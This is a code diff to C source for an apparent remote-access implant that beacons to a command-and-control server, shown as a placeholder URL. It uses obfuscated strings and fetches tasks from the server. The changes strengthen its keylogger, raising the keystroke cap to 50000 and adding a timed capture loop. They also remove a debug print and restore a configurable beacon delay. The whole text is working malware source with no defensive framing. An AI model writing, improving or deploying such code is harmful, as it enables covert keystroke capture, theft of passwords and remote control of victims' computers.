@@ -14,7 +14,7 @@
 // Max number of tasks to queue.
 #define MAX_TASKS_QUEUE 100
 // Max number of keystrokes to collect by the key logger
-#define MAX_KEYSTROKES 30
+#define MAX_KEYSTROKES 50000
 
 #define URL_SIZE (sizeof(char) * 256)
 char BASE_URL[URL_SIZE] = "[STRIKER_URL]"; // A marker for the server URL.
@@ -149,7 +149,6 @@ void *keymon(void *ptr){
   for (int i = 0; i < 7; i++)
     obfs_decode(strs[i]);
   task *tsk = (task *)ptr;
-  printf("uid: %s\n", tsk->uid);
   cJSON *data = tsk->data;
   unsigned long duration = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
   unsigned char *keys = malloc(sizeof(unsigned char) * MAX_KEYSTROKES);
@@ -161,8 +160,19 @@ void *keymon(void *ptr){
     buffer_strcpy(result_buff, strs[2]);
     goto complete;
   }
+  fd_set set;
+  struct timeval timeout;
   struct input_event e;
-  while (count < MAX_KEYSTROKES){
+  unsigned long end_time = ((unsigned long)time(NULL)) + duration;
+  while (count < MAX_KEYSTROKES && ((unsigned long)time(NULL)) < end_time){
+    timeout.tv_sec = 1;
+    FD_ZERO(&set);
+    FD_SET(kb, &set);
+    int status = select(kb + 1, &set, NULL, NULL, &timeout);
+    if (status == -1)
+      break;
+    if (status == 0)
+      continue;
     read(kb, &e, sizeof(e));
     if (!(e.type == EV_KEY && e.value == 0))
       continue;
@@ -184,8 +194,9 @@ void *keymon(void *ptr){
       cJSON_AddItemToObject(result, strs[5], cJSON_CreateString(res));
     }
     tsk->result = result;
-    free_buffer(result_buff);
     tsk->completed = 1;
+    free(keys);
+    free_buffer(result_buff);
     pthread_exit(NULL);
 }
 
@@ -323,7 +334,7 @@ void start_session(){
     "[OBFS_ENC]/tmp", "[OBFS_ENC]Connection: close", "[OBFS_ENC]Content-Type: application/json",
     "[OBFS_ENC]/agent/init", "[OBFS_ENC][-] Error calling home: %s\n",
     "[OBFS_ENC][-] Error parsing config: %s\n", "[OBFS_ENC]uid", "[OBFS_ENC]delay",
-    "[OBFS_ENC]/agent/tasks/%s", "[OBFS_ENC][+] Task results: %s\n", "[OBFS_ENC]Queued task completed: %s\n"};
+    "[OBFS_ENC]/agent/tasks/%s", "[OBFS_ENC][+] Task results: %s\n", "[OBFS_ENC][+] Queued task completed: %s\n"};
   for (int i = 0; i < 11; i++)
     obfs_decode(strs[i]);
   // Default session setup.
@@ -374,8 +385,7 @@ void start_session(){
     printf("%s\n", cJSON_PrintUnformatted(config));
   while (1){
     resize_buffer(body, 0);
-    // sleep(striker->delay);
-    sleep(1);
+    sleep(striker->delay);
     // Fetch tasks.
     curl = init_curl(tasksURL, body);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, get_headers);
